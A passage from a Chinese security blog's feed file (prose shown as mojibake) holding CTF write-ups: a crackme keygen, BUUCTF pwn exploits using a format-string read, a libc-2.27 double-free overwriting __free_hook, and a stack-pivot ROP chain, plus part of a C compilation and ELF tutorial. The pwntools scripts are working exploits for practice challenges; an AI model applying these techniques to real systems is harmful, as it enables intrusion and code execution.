class="number">0</span>);</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå®šä½åˆ°è¿™ä¸ªåœ°æ–¹<br>ä¸»è¦åˆ†æä¸€ä¸‹v5å’Œv7éƒ½æ˜¯å•¥ï¼Œé€šè¿‡idaçš„ä¸‡èƒ½xå¼•ç”¨å¤§æ³•ï¼Œè¿½è¸ªåˆ°ä¸€ä¸ªwin32å‡½æ•°ï¼ŒæŸ¥æ‰‹å†ŒæŠŠåŠŸèƒ½å’Œå‚æ•°ç»™ææ¸…æ¥šå°±okäº†<br><img src="https://i.loli.net/2021/03/23/q9bHQUNZxaL6gSc.png" alt="2.png"></p><p>æœ€ç»ˆå‘ç°v5æ˜¯æ³¨å†Œæ—¶çš„åå­—ï¼Œv7æ˜¯æˆ‘ä»¬è¾“å…¥çš„åºåˆ—å·ï¼ŒäºŒè€…ä¹‹é—´é€šè¿‡ä¸€ä¸ªå‡½æ•°æ¥å¤„ç†ï¼Œæœ¬åœ°è¿è¡Œä¸€ä¸‹å‡½æ•°å°±è¡Œäº†ï¼Œç›´æ¥å‡ºåºåˆ—å·</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+5Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> a1[] = <span class="string">&quot;Alex&quot;</span>;</span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">    v3 += a1[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="number">431136</span> * v3 - <span class="number">3000</span>) / <span class="number">2</span> - *a1));</span><br><span class="line">&#125;          </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/23/WFdr8CReqc2Qliu.png" alt="6.png"></p><h2 id="WarGames"><a href="#WarGames" class="headerlink" title="WarGames"></a>WarGames</h2><ul><li>level : 2</li><li>Platform : Unix/linux etc.</li><li>Description : Use ./WarGames pass</li></ul><p>å¤ªç®€å•äº†ï¼ŒæŠŠä»–çš„ç®—æ³•è·‘ä¸€éå°±æŠŠç»“æœå‡ºæ¥äº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> crackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwnç³»åˆ—1</title>
      <link href="2021/03/13/pwn1/"/>
      <url>2021/03/13/pwn1/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸‹buuctf pwnçš„write up</p><h2 id="judgement-mna-2016"><a href="#judgement-mna-2016" class="headerlink" title="judgement_mna_2016"></a>judgement_mna_2016</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// esp</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">144</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Flag judgment system\nInput flag &gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( getnline(&amp;format, <span class="number">0x40</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;format, flag) )</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nCorrect flag!!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nWrong flag...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unprintable character&quot;</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘å°±æ˜¯ä¹‹å‰æŠŠflagæ–‡ä»¶è¯»å…¥å†…å­˜ï¼Œç„¶åè¾“å…¥å­—ç¬¦ä¸²å’Œflagå­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”<br>ä¸»å‡½æ•°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨æ ˆä¸Šæ‰¾åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°çš„ä½ç½®ï¼Œç„¶åç›´æ¥è¯»å‡ºæ¥å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./judgement_mna_2016&quot;</span></span><br><span class="line">port = <span class="string">&quot;29113&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input flag &gt;&gt; &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%28$s&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h2><ul><li>è€ƒç‚¹<ol><li>ç¨‹åºè°ƒè¯•ï¼Œæ ˆæº¢å‡ºæ³„æ¼åœ°å€</li><li>libc-2.27 UAF</li></ol></li></ul><p><a href="https://sm.ms/image/iCz5hIJNQDXTvlr" target="_blank"><img src="https://i.loli.net/2021/03/14/iCz5hIJNQDXTvlr.png" /></a></p><p>ç¨‹åºå…ˆç»™äº†ä¸€ä¸ªè¾“å…¥nameå’Œidçš„ä¸œè¥¿ï¼Œå‘ç°äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²ä½†æ˜¯ç”±äºæ˜¯__printf_chkï¼Œæ‰€ä»¥æ²¡æ‰¾åˆ°å¥½çš„åˆ©ç”¨ç‚¹<br>ç„¶åä¸‹é¢æ˜¯è¾“å…¥idï¼Œè¿˜æœ‰ä¸ªputsï¼Œè°ƒè¯•å‘ç°idåé¢æ˜¯æœ‰libcå‡½æ•°setbufferçš„ï¼Œåˆå› ä¸ºæ˜¯putså‡½æ•°ç›´æ¥æ¥ç»™ä»–æ³„æ¼å‡ºæ¥<br><a href="https://sm.ms/image/3nmz2dy6jRKb9Pi" target="_blank"><img src="https://i.loli.net/2021/03/14/3nmz2dy6jRKb9Pi.png" /></a></p><p>addåŠŸèƒ½åªå…è®¸ç”³è¯·0-0x50å¤§å°çš„chunk<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt; <span class="number">0</span> &amp;&amp; size &gt; <span class="number">0x50</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><br>deleteåŠŸèƒ½å­˜åœ¨UAF<br>åœ¨è€ç‰ˆçš„libc-2.27ä¸‹æ˜¯å…è®¸double freeå­˜åœ¨çš„<br>ç„¶åç›´æ¥æ”¹__free_hookä¸ºsystemä¸€æŠŠæ¢­å°±è¡Œäº†<br>æ–°ç‰ˆçš„æ‰“å®Œä»Šå¤©çš„VNå†è¯•ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_2019_en_3&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;27391&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the size of story:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;please inpute the story:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">231</span></span><br><span class="line">leak_libc(leak)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(__free_hook))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(system))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-actfæ ˆè¿ç§»</title>
      <link href="2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>ç»™å‡ºexpå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ACTF_2019_babystack&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;29886&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your message will be saved at 0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),base = <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ad3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400a18</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload = payload + p64(<span class="number">0</span>)</span><br><span class="line">payload = payload + p64(pop_rdi_ret)</span><br><span class="line">payload = payload + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(<span class="number">0x4008f6</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload = payload + p64(stack)</span><br><span class="line">payload = payload + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">leak_libc(leak)</span><br><span class="line">og = libc_base + <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(<span class="number">0xd8</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="åˆ†æå›é¡¾æ ˆè¿ç§»"><a href="#åˆ†æå›é¡¾æ ˆè¿ç§»" class="headerlink" title="åˆ†æå›é¡¾æ ˆè¿ç§»"></a>åˆ†æå›é¡¾æ ˆè¿ç§»</h2><p>æ²¡æœ‰å¼€PIEä¿æŠ¤å’ŒCanary</p><ul><li>IDAåˆ†æç»“æœå¦‚ä¸‹<br><img src="https://i.loli.net/2021/03/12/zGy2nY6fm3SCPN5.png" /></li></ul><p>é¢˜ç›®ç»™å‡ºæ ˆåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ˆè¿ç§»åˆ°æ ˆä¸Šï¼Œå¸ƒç½®gadgetæ³„æ¼libcåœ°å€ç„¶åone_gadgetä¸€æŠŠæ¢­</p><ul><li>æ ˆå¸§ç»“æ„å¦‚ä¸‹<br><img src="https://i.loli.net/2021/03/12/FjcnmS6bw1JlXxa.png" /></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> æ ˆè¿ç§» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äºŒè¿›åˆ¶ç¨‹åºä»æºæ–‡ä»¶åˆ°å¯æ‰§è¡Œç¨‹åºçš„è¿‡ç¨‹</title>
      <link href="2021/03/09/binary-programming/"/>
      <url>2021/03/09/binary-programming/</url>
      
        <content type="html"><![CDATA[<p>åœ¨cè¯­è¨€ä¸­ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ä¸€ä¸ªæºç¨‹åºä»æºç åˆ°å¯æ‰§è¡Œæ–‡ä»¶éƒ½è¦ç»å†é¢„å¤„ç†ï¼Œç¼–è¯‘ï¼Œæ±‡ç¼–å’Œé“¾æ¥çš„è¿‡ç¨‹ï¼Œæœ€ç»ˆå½¢æˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åæ‰è¢«æ“ä½œç³»ç»Ÿè£…è½½è¿›å†…å­˜è¿è¡Œã€‚</p><p>ä¸ºäº†å¤ä¹ pwnçŸ¥è¯†ï¼Œå†™ä¸ªæ–‡ç« æ¥æ¢ç©¶ä¸€ä¸‹ç»å¸¸è¢«æˆ‘å¿½ç•¥çš„å…³äºç¨‹åºçš„ä¸­é—´è¿‡ç¨‹ã€‚</p><h2 id="é¢„ç¼–è¯‘"><a href="#é¢„ç¼–è¯‘" class="headerlink" title="é¢„ç¼–è¯‘"></a>é¢„ç¼–è¯‘</h2><p>è¯¥è¿‡ç¨‹ä¸»è¦å¤„ç†æºä»£ç ä¸­ä»¥â€™#â€™å¼€å§‹çš„é¢„ç¼–è¯‘æŒ‡ä»¤<br>å…·ä½“å¤„ç†è§„åˆ™å¦‚ä¸‹ï¼š</p><ul><li>åˆ é™¤#defineå¹¶å±•å¼€æ‰€æœ‰çš„å®å®šä¹‰</li><li>å¤„ç†æ‰€æœ‰æ¡ä»¶é¢„ç¼–è¯‘æŒ‡ä»¤ï¼šå¦‚ â€œ#ifâ€ç­‰</li><li>å¤„ç†â€#includeâ€é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œå°†è¢«åŒ…å«çš„æ–‡ä»¶æ’å…¥åˆ°è¯¥é¢„ç¼–è¯‘æŒ‡ä»¤çš„ä½ç½®</li><li>åˆ é™¤æ³¨é‡Šï¼Œæ·»åŠ è¡Œå·å’Œæ–‡ä»¶åæ ‡è¯†</li></ul><p>é¢„ç¼–è¯‘çš„è¿‡ç¨‹å¯ç”¨å¦‚ä¸‹æŒ‡ä»¤æ¥æ‰§è¡Œ </p><p><code>gcc -E BinaryName.c -o BinaryName.i</code></p><p>æºä»£ç å¦‚ä¸‹ï¼š<br><img src="https://i.loli.net/2021/03/09/AMG6ofRz71mCxev.png" style="zoom:50%;"/></p><p>ç»è¿‡é¢„ç¼–è¯‘åï¼š<br><img src="https://i.loli.net/2021/03/09/oQRzCvZfhs38HTy.png" style="zoom:50%;"/></p><h2 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h2><p>ç¼–è¯‘è¿‡ç¨‹ç»è¿‡ä¸€ç³»åˆ—è¯æ³•åˆ†æç­‰æ­¥éª¤ç”Ÿæˆæ±‡ç¼–ä»£ç æ–‡ä»¶ï¼Œæ˜¯ç¨‹åºæ„å»ºçš„æ ¸å¿ƒéƒ¨åˆ†<br>ä¸åŒçš„æ“ä½œç³»ç»Ÿæœ‰ä¸åŒçš„ç¼–è¯‘å™¨ï¼Œæ¯”å¦‚Linuxä¸‹çš„gccï¼Œg++ï¼ŒWindowsä¸‹çš„MSVCCLç­‰ï¼ˆåæ–‡éƒ½ä»¥Linuxå¹³å°ä¸‹æ¥æ¢ç©¶ï¼‰<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>gcc -S BinaryName.i -o BinaryName.s</code>æˆ–è€…<code>gcc -S BinaryName -o BinaryName.s</code>æ¥æŸ¥çœ‹ç»è¿‡ç¼–è¯‘åçš„æ–‡ä»¶</p><p><img src="https://i.loli.net/2021/03/09/bps3QmPGn5ScZJr.png" style="zoom:50%;"/></p><h2 id="æ±‡ç¼–"><a href="#æ±‡ç¼–" class="headerlink" title="æ±‡ç¼–"></a>æ±‡ç¼–</h2><p>æ±‡ç¼–è¿‡ç¨‹å¯ä»¥å°†æ±‡ç¼–ä»£ç è½¬å˜ä¸ºæœºå™¨å¯ä»¥æ‰§è¡Œçš„æŒ‡ä»¤<br><code>gcc -c BinaryName.s -o BinaryName.o</code>æˆ–<br><code>gcc -c BinaryName.c -o BinaryName.o</code></p><h2 id="ç›®æ ‡æ–‡ä»¶"><a href="#ç›®æ ‡æ–‡ä»¶" class="headerlink" title="ç›®æ ‡æ–‡ä»¶"></a>ç›®æ ‡æ–‡ä»¶</h2><p>æˆ‘ä»¬å…ˆçœ‹ä¸‹cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°</p><h3 id="cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°"><a href="#cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°" class="headerlink" title="cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°"></a>cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°</h3><ul><li>å£°æ˜å’Œå®šä¹‰çš„åŒºåˆ«ï¼š<ul><li>å£°æ˜æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨è¯¥å˜é‡æ²¡æœ‰åœ¨å½“å‰æ–‡ä»¶ä¸­å®šä¹‰è€Œæ˜¯åœ¨å…¶ä»–æ–‡ä»¶ä¸­å®šä¹‰</li><li>å®šä¹‰å˜é‡æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨åœ¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ä¸­ç•™å‡ºç©ºé—´æ¥å­˜æ”¾è¯¥å˜é‡</li><li>å®šä¹‰å‡½æ•°æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨åœ¨ç›®æ ‡æ–‡ä»¶ä¸­ç”Ÿæˆè¯¥å‡½æ•°çš„äºŒè¿›åˆ¶ä»£ç </li></ul></li></ul><p>å˜é‡ç±»å‹å¦‚ä¸‹ï¼š</p><ol><li>å…¨å±€å˜é‡ï¼šéstaticï¼Œè¡¨ç¤ºè¯¥å˜é‡çš„ç”Ÿå‘½å‘¨æœŸæ˜¯æ•´ä¸ªç¨‹åºçš„æ‰§è¡ŒæœŸé—´ï¼Œå¯ä»¥è¢«å…¶ä»–æ–‡ä»¶è®¿é—®</li><li>å…¨å±€å˜é‡ï¼šstaticï¼Œç”Ÿå‘½å‘¨æœŸä¹Ÿæ˜¯æ•´ä¸ªç¨‹åºçš„æ‰§è¡ŒæœŸé—´ï¼Œä½†æ˜¯ä¸èƒ½è¢«å…¶ä»–æ–‡ä»¶è®¿é—®</li><li>å±€éƒ¨å˜é‡ï¼šstaticï¼Œç”Ÿå‘½å‘¨æœŸæ˜¯ç¨‹åºçš„æ‰§è¡ŒæœŸé—´ï¼Œä½†æ˜¯ä½œç”¨åŸŸä»…åœ¨è¯¥å‡½æ•°ä½“ä¸­</li><li>å±€éƒ¨å˜é‡ï¼šéstaticï¼Œä»…å­˜åœ¨äºå½“å‰å½“å‰å‡½æ•°ä½“ä¸­</li></ol><p>å¯¹äºå‡½æ•°ä¹ŸåŒç†ï¼Œå¦‚æœå®šä¹‰äº†staticåˆ™æ— æ³•è¢«å…¶ä»–æ–‡ä»¶æ‰€è¯»å–</p><h3 id="ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼"><a href="#ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼" class="headerlink" title="ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼"></a>ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼</h3><p>éƒ¨åˆ†æ®µåå¦‚ä¸‹</p><ul><li>.dataæ®µä¿å­˜å·²ç»åˆå§‹åŒ–çš„å…¨å±€é™æ€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡</li><li>.rodataæ®µå­˜æ”¾çš„æ˜¯åªè¯»æ•°æ®ï¼Œä¸€èˆ¬æ˜¯ç¨‹åºé‡Œé¢çš„åªè¯»å˜é‡ï¼ˆconstä¿®é¥°çš„ï¼‰å’Œå­—ç¬¦ä¸²å¸¸é‡</li><li>.bssæ®µå­˜æ”¾çš„æ˜¯æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡</li><li>.commentå­˜æ”¾çš„æ˜¯ç¼–è¯‘å™¨ç‰ˆæœ¬ä¿¡æ¯</li><li>.debugå­˜æ”¾è°ƒè¯•ä¿¡æ¯</li><li>.dynamicå­˜æ”¾åŠ¨æ€é“¾æ¥ä¿¡æ¯</li><li>.strtab String Tableå­—ç¬¦ä¸²è¡¨ï¼Œç”¨äºå­˜æ”¾ELFæ–‡ä»¶ä¸­ç”¨åˆ°çš„å„ç§å­—ç¬¦ä¸²</li><li>.symtab Symbol Tableç¬¦å·è¡¨</li><li>.plt .got åŠ¨æ€é“¾æ¥çš„è·³è½¬è¡¨å’Œå…¨å±€å…¥å£è¡¨</li><li>.init ç¨‹åºåˆå§‹åŒ–æ®µ</li><li>.fini ç¨‹åºç»ˆç»“ä»£ç æ®µ</li></ul><p>ELFæ–‡ä»¶å¤´ç»“æ„ä½“å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  